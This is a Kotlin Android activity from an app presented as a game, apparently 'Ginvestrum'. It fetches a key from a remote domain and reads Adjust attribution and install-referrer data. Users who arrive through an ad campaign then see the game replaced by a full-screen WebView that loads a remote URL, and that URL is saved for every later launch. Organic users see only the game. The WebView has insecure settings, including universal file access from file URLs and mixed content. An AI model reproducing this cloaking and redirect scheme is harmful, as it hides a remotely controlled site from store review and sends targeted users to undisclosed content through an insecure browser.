package com.eqcpert.ginvestrum

import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.OnBackPressedCallback
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.OnAttributionReadListener
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.eqcpert.ginvestrum.databinding.ActivityGameBinding
import com.eqcpert.ginvestrum.util.OneTime
import com.eqcpert.ginvestrum.util.isNotNullAndEmptyAndText
import com.eqcpert.ginvestrum.util.log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private companion object {
        const val DOMAIN = "https://jointdiskdismay.mom/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    private val referrerClient    = InstallReferrerClient.newBuilder(appContext).build()
    private var referrer: String? = null

    var blockBack: () -> Unit = {}

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("SAVER", Context.MODE_PRIVATE)
        initWeb()

        val sharedValue = sharedPreferences.getString("isValues", "any") ?: "any"

        referrerClient.startConnection(getInstallReferrerStateListener())

        try {
            if (sharedValue == "any") {
                coroutine.launch(Dispatchers.IO) {
                    val key = fetchJsonFromUrl()
                    if (key != null) {
                        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION
                        val config      = AdjustConfig(this@GameActivity, key, environment)

                        Adjust.initSdk(config)
                        Adjust.getAttribution(AdjustReadListener())
                    } else {
                        screenTypeFlow.value = ScreenType.Game
                    }
                }
            } else {
                showUrl(sharedValue)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }

    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Init Web ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()

            // Реєструємо зворотний виклик у диспетчері
            onBackPressedDispatcher.addCallback {
                if (canGoBack()) {
                    goBack()
                } else {
                    if (isVisible) {
                        isVisible = false
                    } else blockBack()
                }
            }
        }
    }

    private fun showUrl(url: String) {
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
        setNavBarColor(R.color.white)
        setStatusBarColor(R.color.black, false)
        removeGame()
    }

    fun showUrlPrivacyPolicy() {
        coroutine.launch(Dispatchers.Main) {
            binding.webView.apply {
                isVisible = true
                loadUrl(DOMAIN)
            }
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return false
        }
    }

    // Init Service -----------------------------------------------------------------------------

    private fun getInstallReferrerStateListener() = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {

            when (responseCode) {
                InstallReferrerClient.InstallReferrerResponse.OK -> {
                    val response: ReferrerDetails = referrerClient.installReferrer
                    val referrerUrl: String = response.installReferrer
                    log("Referrer URL: $referrerUrl")
                    referrer = referrerUrl
                }
                InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                    log("ERROR: FEATURE_NOT_SUPPORTED")
                }
                InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                    log("ERROR: SERVICE_UNAVAILABLE")
                }
            }
        }

        override fun onInstallReferrerServiceDisconnected() {}
    }

    private inner class AdjustReadListener : OnAttributionReadListener {
        override fun onAttributionRead(attribution: AdjustAttribution?) {
            val clickLabel = attribution?.clickLabel
            val campaign   = attribution?.campaign

            log("result $attribution | $clickLabel | $campaign")

            if (attribution != null) {
                if (campaign.isNotNullAndEmptyAndText("None")) {
                    val link = "${DOMAIN}ncz8R9B2?invexca=$campaign&invexlab=$clickLabel&invexprf=$referrer"
                    log("link = $link")
                    sharedPreferences.edit().putString("isValues", link).apply()
                    showUrl(link)
                } else screenTypeFlow.value = ScreenType.Game
            } else screenTypeFlow.value = ScreenType.Game
        }
    }

    enum class ScreenType {
        None, Game
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(colorId)
        }
    }

    fun setStatusBarColor(colorId: Int, isLight: Boolean = true) {
        coroutine.launch(Dispatchers.Main) {
            window.statusBarColor = getColor(colorId)
            window.decorView.systemUiVisibility = if (isLight) View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR else 0
        }
    }

    private fun removeGame() {
        coroutine.launch(Dispatchers.Main) {
            binding.root.removeView(binding.navHostFragment)
        }
    }

    private suspend fun fetchJsonFromUrl() = CompletableDeferred<String?>().also { continuation ->
        val urlString = "${DOMAIN}ncz8R9B2?invexca=invexkey"

        try {
            // Створюємо URL об'єкт
            val url = URL(urlString)

            // Відкриваємо з'єднання
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"  // Використовуємо GET метод
            connection.connectTimeout = 5000  // Таймаут на підключення
            connection.readTimeout = 5000     // Таймаут на читання
            connection.instanceFollowRedirects = true  // Автоматично слідуємо за редиректами

            // Отримуємо код відповіді від сервера
            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Читаємо відповідь у вигляді рядка
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                // Перетворюємо відповідь на JSON об'єкт
                val jsonResponse = JSONObject(response.toString())
                continuation.complete(jsonResponse.getString("value"))
            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }

            connection.disconnect() // Закриваємо з'єднання

        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()


}